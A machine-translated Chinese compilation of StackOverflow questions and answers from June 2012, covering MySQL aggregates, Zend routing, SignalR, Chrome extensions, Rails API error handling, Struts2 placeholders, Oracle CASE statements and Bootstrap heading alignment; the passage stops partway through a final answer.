# StackOverflow 问答 11155000-11155999

# mysql - 在 WHERE 中无效使用组函数 SUM()

> ID：11155001
> 
> 赞同：3
> 
> 时间：2012-06-22T11:05:42.920
> 
> 标签：mysql, subquery, sum, where

我的查询有问题。

我想在我的 WHERE 中使用 SUM，但它一直给我无效使用组函数。

```
AND SUM((invoices_out.net+invoices_out.vat)/currencies.rateVsPound)
>
(SELECT SUM(jobs_payments_accounts.amount/currencies.rateVsPound)
 FROM jobs_payments_accounts, jobs, enquiries, currencies
 WHERE jobs_payments_accounts.jobRef = jobs.id
 AND jobs_payments_accounts.currencyRef = currencies.id
 AND enquiries.id = jobs.enquiryRef
 AND enquiries.entityRef = ed.id) 
```

> 的右侧工作完美，但我怎样才能实现我想要用左侧做的事情？

这是完整的子查询：

```
IF(ed.paymentTermsRef = 3,
(SELECT SUM((invoices_out.net+invoices_out.vat)/currencies.rateVsPound)
FROM enquiries, jobs, (SELECT * FROM invoices_out_reference GROUP BY invoiceRef) AS iorUnique,
                                (SELECT enquiryRef, sellingCurrency FROM parts_trading GROUP BY enquiryRef) AS PTU,
                                currencies,
                                invoices_out
                                    WHERE enquiries.entityRef = ed.id
                                    AND enquiries.id = jobs.enquiryRef
                                    AND PTU.enquiryRef = enquiries.id
                                    AND PTU.sellingCurrency = currencies.id
                                    AND jobs.id = iorUnique.jobRef
                                    AND iorUnique.invoiceRef = invoices_out.id
                                    AND invoices_out.paid = 0
                                AND SUM((invoices_out.net+invoices_out.vat)/currencies.rateVsPound)
                                    >
                                    (SELECT SUM(jobs_payments_accounts.amount/currencies.rateVsPound)
                                         FROM jobs_payments_accounts, jobs, enquiries, currencies
                                         WHERE jobs_payments_accounts.jobRef = jobs.id
                                         AND jobs_payments_accounts.currencyRef = currencies.id
                                         AND enquiries.id = jobs.enquiryRef
                                         AND enquiries.entityRef = ed.id)
                                #AND jobs.id NOT IN
                                #       (SELECT jobRef FROM jobs_payments_accounts)
                                #   AND jobs.id NOT IN
                                #       (SELECT jobRef FROM jobs_payments_advance)
                                AND jobs.id IN
                                    (SELECT jobRef FROM invoices_out_reference)
                                AND DATEDIFF(NOW(), invoices_out.date) >= 30),
                                NULL
                             ) 
```

* * *

尝试使用 IS NULL 实现您的建议，但这会使查询**速度**变慢。

仍然有很多麻烦，希望我能尽快破解它。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-22T11:16:27.430

“聚合函数用户俱乐部”的第一条规则是：

> 您不要在 WHERE 中使用聚合函数

“聚合函数用户俱乐部”的第二条规则是：

> 您不要在 WHERE 中使用聚合函数

`HAVING`在这种情况下必须使用从句：这是[一个很好的主题](https://stackoverflow.com/questions/2330840/mysql-invalid-use-of-group-function)来研究它的一些复杂性。

而且我真的建议重组您的查询（例如，为什么要使用嵌套子查询来签`jobs.id`入三个不同的表而不是`LEFT JOIN ... ON id IS NULL`？）或将其划分为具有临时表的较小的查询。没有冒犯，但是当看到你引用的内容时，我实际上可以听到你的 DB 哭声。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-06-22T11:11:56.643

您必须使用`HAVING`聚合函数：

```
select ...
from ...
where ...
group by ...
having sum(...) > ... 
```

# zend-framework - Zend Routes 翻译 URL

> ID：11155002
> 
> 赞同：2
> 
> 时间：2012-06-22T11:05:43.823
> 
> 标签：zend-framework, zend-route

1）我有一个控制器“日历”，并有一个动作“showDate”，它通过url获取日期。所以，网址类似于“日历/显示日期/日期/2012-07-22”

2）我有一个显示所有条目的链接，“日历/”

所以，我想创建路线，使我的链接看起来像“kalendar/2012-07-22”和“kalendar/”。

谁能帮我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-14T03:53:59.310

根据这篇文章： [http ://www.zf.fr/forum/viewtopic.php?id=5138](http://www.z-f.fr/forum/viewtopic.php?id=5138)

解决方案是将 '@locale' => $lang 添加到参数中。

```
$this->url(array('lang'=>'it','@locale'=>'it')) 
```

它对我来说效果很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T13:18:37.243

我一直在研究用 Zend_Translate 翻译 URL，我遇到了这个网站的插件，它试图自动翻译 URL 段（模块/控制器/操作）。

[http://blog.helmich.cz/305-howto-simple-multilingual-routes-in-zend-framework/](http://blog.helmich.cz/305-howto-simple-multilingual-routes-in-zend-framework/)

好消息是它是一个修改后的自定义路由器类，其功能类似于 Zend_Router，因此它相对比较熟悉。

```
$pages = new MyApp_Controller_Router_Route(
    ':locale/:@controller/:@action/*',
    array(
        'controller' =>; 'index',
                'action'     => 'index',
                'locale'     => 'cs'
            )
);

$router->addRoute('pages',$pages); 
```

您需要在您的 URL 中有一个语言 ID（在上面的示例中称为 :locale），以便您的 Zend_Translate 可以设置正确的语言。

```
www.example.com/en/calendar/2012-06-22/
www.example.com/fr/calendrier/2012-06-22/
www.example.com/de/kalender/2012-06-22/
www.example.com/it/calendario/2012-06-22/ 
```

我只是稍微玩了一下这个概念，但我记得它有希望。您必须更加熟悉 Zend_Translate： http: [//framework.zend.com/manual/en/zend.translate.html](http://framework.zend.com/manual/en/zend.translate.html)

我希望这会有所帮助！

干杯!

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:27:48.023

*您可以将calendar*的所有调用重新路由到*kalendar*。有两种可能性，要么使用 Zend（首选），要么更改 Web 服务器配置以使用 HTTP 302重写对*日历的调用（丑陋）。*

[但是，您应该查阅Zend](http://framework.zend.com/apidoc/core/db_Controller_Router_Rewrite.html#%5CZend_Controller_Router_Rewrite)官方文档，这非常好

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:04:27.013

您必须设置自定义路线，这是我的方式：

在文件夹 application/configs/ 创建名为“routes.ini”的文件

将您的路线放入文件中：

```
;index-homepage, parameter date isn't required
;"index" is key of your route
routes.index.route = "kalendar/:date" 
routes.index.defaults.controller = calendar
routes.index.defaults.action = show
routes.index.defaults.date = 
```

因此，在您的 bootstrap.php 中定义该配置文件：

```
protected function _initRoute() {
    $router = Zend_Controller_Front::getInstance()->getRouter();
    $router->addDefaultRoutes();

    $config = new Zend_Config_Ini(APPLICATION_PATH . '/configs/routes.ini');
    $router->addConfig($config, 'routes');
} 
```

就是这样，你可以调用 URL

www.website.com/kalendar

和

www.website.com/kalendar/2012-1-1

有关详细信息，请参阅此问题中的答案： [Zend Framework 中的简单重写](https://stackoverflow.com/questions/8966643/simple-rewrites-in-zend-framework/8968926#8968926)

# signalr - SignalR - 向除呼叫者以外的所有客户端广播

> ID：11155008
> 
> 赞同：5
> 
> 时间：2012-06-22T11:06:01.703
> 
> 标签：signalr

有没有办法向所有连接的客户端发送消息，除了发送消息的客户端。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-10-24T15:38:33.080

在 2014 年，您可以[选择](http://www.asp.net/signalr/overview/guide-to-the-api/hubs-api-guide-server#selectingclients)带有集线器的客户端。

**Others**属性发布给除调用客户端之外的所有客户端。

```
Clients.Others.addContosoChatMessageToPage(name, message); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-26T10:36:29.210

还没有，你今天唯一能做的就是在客户端过滤。

# google-chrome-extension - 从内容脚本调用 chrome.browserAction.setIcon，就像在后台脚本中完成的那样

> ID：11155009
> 
> 赞同：3
> 
> 时间：2012-06-22T11:06:10.877
> 
> 标签：google-chrome-extension

我正在为 chrome 做一个扩展。它从网页中获取数据并通过本地电子邮件客户端通过电子邮件发送。我有一个工具栏按钮，用户必须单击该按钮才能调用脚本。

我的脚本适用于几个选定的网址。我希望我的工具栏按钮根据 url 是否在我们的列表中来更改图标。例如，对于 site1，它应该是 redicon.png，对于 site2，它应该是 blueicon.png。我可以使用 chrome.browserAction.setIcon 更改按钮图标。但问题是这个 API 在内容脚本中不起作用。它在 background.js 文件中运行良好，但在 content.js 中运行良好。请告诉我如何实现这一目标。

我知道使用 pageAction 可以解决问题，但我的客户要求是工具栏图标应该更改而不是出现和消失。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T11:32:30.270

您需要阅读的是[消息传递](http://code.google.com/chrome/extensions/messaging.html)。你是对的，内容脚本有有限的 chrome API。但是，您可以从内容脚本联系后台页面，并告诉它为您执行 chrome API 中的任何内容。首先，您需要在后台页面上创建一个[侦听](http://code.google.com/chrome/extensions/extension.html#event-onRequest)器，该侦听器将等待消息，然后从内容脚本[发送消息。](http://code.google.com/chrome/extensions/extension.html#method-sendRequest)

# scala - Scala 调度 | 以可编程方式登录网站

> ID：11155010
> 
> 赞同：3
> 
> 时间：2012-06-22T11:06:12.343
> 
> 标签：scala, scala-dispatch

我仍在努力以编程方式登录到一个站点，我的代码：

```
val h = new Http 
val req = url("http://www.smanager.pl/logowanie.php") << 
    Map("username" -> "MYUSERNAME", "password" -> "MYPASSWORD") 
val handler = req.POST >>> System.out print(h(handler)) 
```

用户名和密码在脚本中肯定是正确的，但是`system.out`我看到了登录表单的 html。它不起作用。任何人知道如何处理它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-29T01:09:08.857

您是否尝试使用 curl 登录或至少转储请求？也许您需要另外指定身份验证类型，例如 Digest

# sql-server - SQL Server 中的运算符 != 和 <> 有什么区别？

> ID：11155012
> 
> 赞同：2
> 
> 时间：2012-06-22T11:06:13.300
> 
> 标签：sql-server, sql-server-2008

> **可能重复：**
> [我应该在 TSQL 中使用 != 或 <> 表示不相等吗？](https://stackoverflow.com/questions/723195/should-i-use-or-for-not-equal-in-tsql)

两个操作员的行为是相同的。但我想知道SQL Server 中的operator **!=**和**<>**有什么区别？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:10:00.797

`!=`从技术上讲，两者`<>`都是相同的。即使您在存储过程中使用它们，它们在性能方面也将表现相同。作为[SQL 标准](http://en.wikipedia.org/wiki/SQL)，您应该更喜欢`<>`.

**注意：** `!=`运算符不是标准 SQL。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T11:08:48.907

它们是等价的。唯一的区别是`<>`是 ISO 标准，`!=`不是。

查看此链接：http: [//msdn.microsoft.com/en-us/library/ms188074.aspx](http://msdn.microsoft.com/en-us/library/ms188074.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:10:20.660

`a <> b`基本上检查 a 是否小于或大于 b；即，不等于b。我相信 a 和 b 都被转换为它们的 ascii 值，然后进行比较。

# google-analytics - 网站搜索的行业基准

> ID：11155018
> 
> 赞同：1
> 
> 时间：2012-06-22T11:06:34.863
> 
> 标签：google-analytics, analytics, benchmarking

我们被要求提高客户网站搜索的性能。在开始之前，我们想设定基准。我已询问客户他们是否愿意启用一致的数据共享，因此我们可以访问行业基准，因为我无法控制此设置：http: [//support.google.com/analytics/bin/answer.py? hl=zh-CN&answer=1011397](http://support.google.com/analytics/bin/answer.py?hl=en&answer=1011397)但是，听起来 Google 分析阵营的情况发生了变化，而这些报告现在只能通过时事通讯获得？这是真的？

此外，这些报告是否会给我提供行业标准来比较我的客户当前的搜索性能？或者是否有其他提供这些基线标准的服务？

这是我们感兴趣的数据示例。这是我们客户当前的搜索性能：

*   搜索访问：772
*   唯一身份搜索总数：1,093
*   结果页面浏览量/搜索：1.36
*   % 搜索退出：56.45%
*   % 搜索优化：24.78%
*   搜索后时间：00:01:40
*   搜索深度：0.59

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-25T21:48:02.063

我在大型电子商务网站工作，我问过我们的 AdWords 代表，最近我想自己访问这类数据。

他说，基准测试在 2011 年 3 月 15 日被取消，此时他们正在尝试使用每月通讯格式来提供相同类型的数据。

据我所知，他们*可能*在（悄悄地）完全退休之前已经完成了一份时事通讯。我从未看过时事通讯，但我想我记得读过那些确实收到过时事通讯的人的报告。

令人失望的是，他们可以访问所有这些数据，但却取消了该程序。我想知道他们是否因为数据完整性问题而取消了它——他们不能保证在所有这些选择加入的站点上安装正确的跟踪代码，所以如果数据质量有问题，那么数据的价值是什么。iono ...只是一个总的猜测。

我们曾经在这里使用 coremetrics，他们有一个可选的基准测试程序。因此，如果您认识任何其他使用 Coremetrics 的网站管理员，您可能会要求他们提供一些基准测试信息。

我们能够从 fireclick.com 获得一些基准数据，但没有一个（我无论如何都见过）涵盖现场搜索。主要只是顶线指标。：-/

因此，对基准数据的搜索仍在继续……

# spring-security - 如何在没有显式身份验证的情况下在 Spring Security 中授予 ACL？

> ID：11155023
> 
> 赞同：3
> 
> 时间：2012-06-22T11:06:52.377
> 
> 标签：spring-security, acl

当我创建一个新实体时，我想向这个新实体授予 ACL 权限（又名 ACL 条目）。到目前为止很容易:-)

问题出现在以下场景中：

*   最终用户无需在网站上进行身份验证即可创建实体。
*   持久化这个新实体的服务因此在没有身份验证上下文的情况下运行。
*   但是：要授予 ACE，需要有一个活动的身份验证上下文。

Spring`JdbcMutableAclService`用于`SecurityContextHolder.getContext().getAuthentication()`获取当前身份验证，因此似乎没有办法绕过这个要求。

任何想法都非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T13:09:31.523

自己找到了答案：

在 Web 应用程序中，*始终*存在身份验证上下文。如果用户未通过身份验证，则身份验证`org.springframework.security.authentication.AnonymousAuthenticationToken`具有单个授予权限：`ROLE_ANONYMOUS`.

因此，授予该用户创建 ACL 的权限很简单。只需将 配置`PermissionGrantingStrategy`为使用此角色来授权请求​​。

# java - 如何在 struts2 文本字段标签中放置占位符？

> ID：11155028
> 
> 赞同：4
> 
> 时间：2012-06-22T11:07:20.423
> 
> 标签：java, html, struts2, placeholder

我正在使用 struts2 标签，并希望在这样的`<s:textfield>`标签中放置一个占位符：

```
<s:set name="email" value="getText('email')" />
...

<s:form action="Login">
    <s:textfield key="email" theme="simple" placeholder="%{email}" 
         cssClass="span3"/>
    ...
</s:form> 
```

`email`被定义`global.properties`为“Correo electronic”。

我的问题是，当我看到 jsp 页面时，没有看到`email`I see的值`%{email}`。

我读到这是在 2.3.1 版中解决的 Struts2 的错误：[https](https://issues.apache.org/jira/browse/WW-3644) ://issues.apache.org/jira/browse/WW-3644 ，但我使用的是 Struts2 2.3.4，而且我一直有同样的问题问题。

任何人都知道这个问题的任何解决方案或将占位符放在文本字段中的任何其他方式？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-02T16:04:47.233

我有同样的问题，我是这样解决的：

```
<s:textfield name="user.email" placeholder="%{getText('settings.email')}" /> 
```

我需要更新我的 Struts 2*和*OGNL jar。我的 OGNL 罐子是`ognl-3.0.5.jar`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T19:36:17.313

您应该使用`#`在堆栈命名空间中创建但未推送的变量的前缀：

```
<s:textfield placeholder="%{#email}" ... etc ... /> 
```

# jquery - 如何使用 Jquery 在 cookie 中添加域名？

> ID：11155029
> 
> 赞同：0
> 
> 时间：2012-06-22T11:07:22.210
> 
> 标签：jquery, jquery-plugins, cookies

我想使用 JQuery (1.6.1) 和 jquery.cookie.js 插件在 cookie 中添加一些带有域名的值。我可以使用以下代码在 cookie 中添加值。

```
 $.cookie('cookie_name', 'cookie_value', { expires : 10 }); 
```

但我无法使用以下代码在 cookie 中添加数据。甚至无法将 cookie 名称或值添加到浏览器。

代码

```
$.cookie('cookie_name', 'cookie_value', { expires: 10, domain: 'example.com', secure: true }) 
```

请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T11:18:30.707

请参考以下链接：

[https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie)

[如何使用 jQuery 设置/取消设置 cookie？](https://stackoverflow.com/questions/1458724/how-to-set-unset-cookie-with-jquery)

它可能会帮助你。

# ruby-on-rails - 处理来自失败的 API 调用的自定义异常代码

> ID：11155032
> 
> 赞同：1
> 
> 时间：2012-06-22T11:07:46.380
> 
> 标签：ruby-on-rails, ruby-on-rails-3, api, httparty

我正在将我们的 Rails (3.2) 应用程序连接到外部 Web 服务（活动监视器），这需要对其系统进行几次调用来设置客户端。

我已将每个操作放入单独的救援块中并包装在事务中，但事情看起来并不那么好。我需要它在每个错误后转义并显示正确的消息。目前它只是逃脱。

我有每个操作可能出现的错误列表 - 如何读取这些错误并将其格式化为 Flash 消息？

例如，以下错误：

```
 CreateSend::BadRequest: The CreateSend API responded with the following error - 172: You can create a maximum of five (5) clients per thirty (30) minutes 
```

我目前在我的控制器中有这个：

```
 def create_send_setup
     ...
      begin

       client = CreateSend::Client.create(@user.company_name, @user.username, @user.email, "(GMT) Dublin, Edinburgh, Lisbon, London", @user.country)

       rescue
        flash[:notice] = "Uh oh, there's been a problem. Please try again. Client"
       end

       begin
         @client = CreateSend::Client.new(@user.createsend_client_api)
         @client.set_access(@user.username, @password, @user.createsend_access_level)
         @client.set_monthly_billing(@user.createsend_currency, true, @user.createsend_markup)

       rescue
          flash[:notice] = "Uh oh, there's been a problem. Please try again. Access"
       end

          flash[:notice] = "Great, now you just need to choose a plan"
          redirect_to edit_user_registration_path    

 end 
```

在以前的集成中，我使用过类似的东西

```
case bla.code.to_s
     when /2../
     when '403'
       raise "Could not update subscriber: new-customer-id is already in use."
     ...
 end 
```

从响应中提取错误代码并显示为 Flash 消息的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:54:25.410

您所能做的就是处理给定的异常 - 如果没有数据有效负载，您可以尝试解析消息字符串，按原样使用它，将其全部或部分映射到您自己的消息等。

例如，如果您显示的示例消息是规范化的，则可以使用正则表达式来获取数字和消息部分：

```
[1] pry(main)> s = "CreateSend::BadRequest: The CreateSend API responded with the following error - 172: You can create a maximum of five (5) clients per thirty (30) minutes"
=> "CreateSend::BadRequest: The CreateSend API responded with the following error - 172: You can create a maximum of five (5) clients per thirty (30) minutes"
[2] pry(main)> md = s.match /.*?- (\d+): (.*)/
=> #<MatchData
 "CreateSend::BadRequest: The CreateSend API responded with the following error - 172: You can create a maximum of five (5) clients per thirty (30) minutes"
 1:"172"
 2:"You can create a maximum of five (5) clients per thirty (30) minutes">
[3] pry(main)> md[1]
=> "172"
[4] pry(main)> md[2]
=> "You can create a maximum of five (5) clients per thirty (30) minutes" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T13:42:48.777

正如戴夫所说，如果异常是你所拥有的，你只能捕获异常并将该异常作为字符串做一些事情。

例如：

```
begin
  ...
rescue Exception => ex
  # here "ex.message" contains your string, you can do anything you want with it
  # or parse as is:
  flash[:notice] = ex.message
end

redirect_to edit_user_registration_path 
```

**更新**

如果您将我提出的解决方案与 Dave 提出的解决方案结合起来，您会得到类似的结果，您可以使用自己的错误字符串：

```
begin
  ...
rescue Exception => ex
  code = ex.message.match(/.*?- (\d+): (.*)/)[1]

  case code
  when '172'
    flash[:notice] = 'Please wait 30 minutes to create more clients'
  end
end

redirect_to edit_user_registration_path 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-19T07:26:13.940

在这种特定情况下处理错误的最佳方法是专门处理库自己定义的错误。created-ruby 定义了[CreateSendError](http://rubydoc.info/gems/createsend/2.3.0/CreateSend/CreateSendError)、[BadRequest](http://rubydoc.info/gems/createsend/2.3.0/CreateSend/BadRequest)和[Unauthorized](http://rubydoc.info/gems/createsend/2.3.0/CreateSend/Unauthorized)。您不需要解析任何字符串。

以下是[README](https://github.com/campaignmonitor/createsend-ruby#handling-errors)中处理错误的示例：

```
require 'createsend'

CreateSend.api_key 'your_api_key'

begin
  cl = CreateSend::Client.new "4a397ccaaa55eb4e6aa1221e1e2d7122"
  id = CreateSend::Campaign.create cl.client_id, "", "", "", "", "", "", "", [], []
  puts "New campaign ID: #{id}"
  rescue CreateSend::BadRequest => br
    puts "Bad request error: #{br}"
    puts "Error Code:    #{br.data.Code}"
    puts "Error Message: #{br.data.Message}"
  rescue Exception => e
    puts "Error: #{e}"
end 
```

该`data`字段始终包含一个`Code`和`Message`，对应于[状态代码 API 文档](http://www.campaignmonitor.com/api/getting-started/#response_codes)。

# c# - 如何限制多行文本框中的 HTML 标签？

> ID：11155034
> 
> 赞同：0
> 
> 时间：2012-06-22T11:08:02.693
> 
> 标签：c#, javascript, jquery, asp.net

我有一个**`Multiline Textbox`**. 我不想让用户类型**`HTML Tags`**或验证可以在服务器端完成。有什么建议么？

当我设置`ValidateRequest="true"`它抛出错误

**从客户端检测到具有潜在危险的 Request.Form 值**

这也不是必需的。我尝试通过检查字符 < 来进行验证，但这也不是正确的验证，因为您可以键入`<kanavi and this is not a HTML tag`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:13:19.997

放`ValidateRequest="false"`

如果输入显示消息中有标签，则在服务器上处理。

你可以删除标签

```
 Regex.Replace(source, "<.*?>", string.Empty); 
```

或者，如果要保留它们，则使用编码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:12:25.167

尝试使用正则表达式，这是为了查找 html 标签。在应用程序端使用它。

```
Regex.Match(TextBox.Text, "</?\w+((\s+\w+(\s*=\s*(?:".*?"|'.*?'|[^'">\s]+))?)+\s*|\s*)/ >"); 
```

我总是在应用程序端使用 XDocument 的另一个解决方案。

创建一个 XDocument 并为其设置根：

```
XDocument yourXDocument = new XDocument(new XElement("Root")); 
```

然后加载内容：

```
yourXDocument.Root = XDocument.Load(TextBox.Text); 
```

然后使用递归函数来查找您的 XDocument 中是否超过 2 个级别。

当然，如果您只想解析 HTML 标签，我认为您必须创建一个 Dictionary 来存储所有标签并将您的文本框值与每个标签进行比较。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:20:54.403

看看 nuget 的这个包。[Html洗衣店](http://nuget.org/packages/HtmlLaundry)

它应该可以帮助您在 HTML 到达服务器之前清除它。

# iphone - Objective C - 一个适用于 iPad 和 iPhone 的故事板

> ID：11155038
> 
> 赞同：8
> 
> 时间：2012-06-22T11:08:36.553
> 
> 标签：iphone, objective-c, ipad, storyboard

我只想知道 iPad 和 iPhone 应用程序是否可以共享同一个故事板？

我目前有 2 个故事板，一个用于 iPad，一个用于 iPhone。是否可以让两个设备从同一个故事板运行？

问候， EZFrag

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-06-22T11:12:47.160

如果您的 iPhone 和 iPad 具有相同的视图，那么这是可能的，您在 iPhone 中创建的视图将拉伸以填满 iPad 屏幕，但是不建议这样做，因为 iPad 具有更大的屏幕，您应该创建具有不同视图排列和结构的不同视图适用于 iPad 和 iPhone

要为 iPad 和 iPhone 设置相同的故事板，请查看屏幕截图

![在此处输入图像描述](../Images/0dd895edd0d8b04ce2f8506f2570c888.png)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-10-23T03:00:30.600

使用 XCode6 Size Classes，您可以正式拥有用于 iPhone（所有分辨率）和 iPad 的相同 Storyboard，从而使您不必让两个文件保持最新。生成的故事板与 iOS7+ 兼容。

在此处阅读有关此内容的更多信息：[https ://developer.apple.com/library/ios/recipes/xcode_help-IB_adaptive_sizes/chapters/AboutAdaptiveSizeDesign.html#//apple_ref/doc/uid/TP40014436-CH6-SW1](https://developer.apple.com/library/ios/recipes/xcode_help-IB_adaptive_sizes/chapters/AboutAdaptiveSizeDesign.html#//apple_ref/doc/uid/TP40014436-CH6-SW1) *使用尺寸类启用一个故事板或 xib 文件，可用于所有可用的屏幕尺寸。这使您的应用程序的用户界面可以在任何 iOS 设备上运行。*

# sql-server - 从本地 Windows 托管服务连接到本地 SQLserver

> ID：11155041
> 
> 赞同：0
> 
> 时间：2012-06-22T11:09:02.047
> 
> 标签：sql-server, windows-services

我有一个本地 Windows 托管服务，它试图连接到 SQLExpress 的本地实例，并且在连接字符串/本地服务需要使用的身份验证方面遇到了障碍。

这是托管服务的配置

```
<add key="..." value="Data Source=<machineName>\SQLEXPRESS;Persist Security Info=True; Integrated Security=True" /> 
```

有趣的是，这可行，但只提供对主数据库的访问。它不提供对服务所需的实际数据库的任何访问权限。我在 SQL Management Studio 中尝试了各种可能性，重新授予访问权限/安全性/用户，但无济于事。

我尝试使用初始目录，但出现安全异常

```
<add key="..." value="Data Source=<machineName>\SQLEXPRESS;Persist Security Info=True;inital catalog=<dbName>; Integrated Security=True" /> 
```

我也在研究这样的假设

一个。托管服务使用的登录是一个红鲱鱼，这确实是一个 SQLServer 问题。

湾。如果 SQLServer 不是本地的，则托管服务将需要 AD 凭据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T13:21:33.663

1.  要访问除 master 之外的特定数据库，您需要添加：
    “Initial Catalog=MyDatabase;” （不带引号）到您的连接字符串。
2.  服务登录帐户必须被授予 SQL Server Express 的登录权限
3.  服务登录帐户必须在您希望从服务访问的数据库中具有用户映射。

最后两个步骤可以从 SQL Server Management Studio 完成。

快乐编码

# sql - Oracle SQL - 是否有更有效的方法来组织大量案例语句

> ID：11155043
> 
> 赞同：0
> 
> 时间：2012-06-22T11:09:06.163
> 
> 标签：sql, oracle, case, space-efficiency

目前我有一份报告查看不同类型的文件。每个文件都有一个指定的时间范围，它应该在（即 2 天、4 天等）之前完成。有100多种文件。目前，为每个文档分配的时间尺度保存在 Excel 电子表格中，并使用 vlookup 公式（基于评估 ID）与 excel 中的数据相匹配。不幸的是，我们的数据库中没有地方可以放置这个指定的时间刻度，但我希望能够从数据库运行报告并将其发送给用户，而无需在 Excel 中进行这种额外的操作。我知道我可以通过编写大量案例陈述来实现这一点（下面只是一个例子）

IE

```
SELECT
ID,
CASE WHEN ID = 1 then '1 day' 
WHEN ID = 2 then '42 days'
WHEN ID = 3 then '16 days'
ELSE 'CHECK' end as 'Timescale'
FROM TABLE1 
```

但我确实想知道在 SQL 中是否有更有效的方法来执行此操作（除了在数据库中请求一个额外的字段来记录这个！）？可能没有，但认为值得一问！谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T11:16:47.147

如果您有 100 个不同的时间尺度，那么将 TIMESCALE 表添加到您的数据库并避免在电子表格中存储对您的业务很重要的信息是合理的。没有什么反对 Excel，优秀的产品，我的一些最好的朋友是 Excel 电子表格 - 但我不会在其中存储关键业务信息。

分享和享受。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:55:58.153

所以你想在一个 Oracle 表和一个 Excel 表之间加入......

我认为这并非完全不可能。有2种方式。

方式1.您可以在Oracle中进行加入。这意味着您必须编写一个可以读取 excel 表的 Java 存储过程。下一步是创建用于包装此 Java 存储过程的 PL/SQL 包装器。之后，您可以编写一条通过 PL/SQL 包装器调用 Java 存储过程的 SQL 语句，该 SQL 语句可以与您的 Oracle 表进行连接。

是的，确实，这非常复杂。

方式 2。我认为您可以通过 ODBC 从 Excel 表连接到 Oracle。应该可以在 excel 中从 Oracle 获取数据。所以excel可以为你做join。

是的，确实，这非常复杂。

您也可以将这些额外数据放入新的 Timescale 表中（如 Bob Jarvis 建议的），但您必须在 excel 表和 Oracle 表之间进行同步。

您还可以将所有数据移至 Oracle。或者，也许您可​​以将所有数据移动到 excel（可能不是）？

# tridion - Tridion 发布和垃圾收集

> ID：11155044
> 
> 赞同：-2
> 
> 时间：2012-06-22T11:09:08.817
> 
> 标签：tridion, tridion2009

我参考了之前的一篇文章[Tridion 2009 模板发布失败](https://stackoverflow.com/questions/10702972/tridion-2009-template-publishing-failure)，其中我解释说我们的系统在大规模发布期间显然是随机崩溃的。

我们正在使用 XSLTMediator，我们所有的模板都基于解决`TemplateBase`方案

我被告知该错误可能与垃圾收集/COM+有关——我认为这有点牵强，TemplateBase解决方案`IDisposable`明确实现了应该处理所有GC/COM+的麻烦？（不像 VBScript 时代的 Set obj = Nothing to avoid memory leaks）！

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T13:17:44.030

听起来您需要进行一些深入的调试。关于该主题的高质量信息的一个来源是[Tess Ferrandez 的博客](http://blogs.msdn.com/b/tess/archive/2008/02/04/net-debugging-demos-information-and-setup-instructions.aspx)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-06-25T19:12:48.453

这里有一些考虑。

1) 使用 Marshal.ReleaseComObject 释放 Tridion COM 对象，但不要只调用一次，直到引用计数器达到 0。

```
while (Marshal.ReleaseComObject(component) > 0); 
```

2) 不要在函数中将 COM 对象作为参数传递。

3) 不要尽可能多地声明或避免将 COM 对象声明为类中的字段。

4) 考虑使用弱引用。弱引用将立即将您的对象标记为准备好进行 GC。由于 .Net GC 在后台线程中运行，并且我们不知道它何时执行，因此始终在所有弱引用中添加一个空值检查，以确保在使用它之前您的对象仍然存在，以防万一已经收集了，您将需要再次实例化弱引用。

# twitter-bootstrap - 引导中心标题

> ID：11155046
> 
> 赞同：111
> 
> 时间：2012-06-22T11:09:11.767
> 
> 标签：twitter-bootstrap, bootstrap-4, html-heading

这是我的第一次 Twitter Bootstrap 体验。我添加了一些标题（h1、h2 等），它们在左侧对齐。将标题居中的正确方法是什么？

* * *

## 回答 #1

> 赞同：157
> 
> 时间：2013-03-01T06:02:02.093

```
.text-left {
  text-align: left;
}

.text-right {
  text-align: right;
}

.text-center {
  text-align: center;
} 
```

bootstrap 为文本对齐添加了三个 css 类。

* * *

## 回答 #2

> 赞同：90
> 
> 时间：2016-05-22T20:44:33.483

只需`class='text-center'`在`<h>`元素中使用中心标题：

```
<h2 class="text-center">sample center heading</h2> 
```

`class='text-left'`在元素中使用`<h>`左标题，`class='text-right'`在`<h>`元素中使用右标题。

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2018-10-28T18:47:37.010

只需在行的类属性中使用“justify-content-center”。

```
<div class="container">
  <div class="row justify-content-center">
    <h1>This is a header</h1>
  </div>
</div> 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2012-06-22T14:45:46.240

根据您的评论，要使所有标题居中，您只需同时添加所有标题`text-align:center`，如下所示：

**CSS**

```
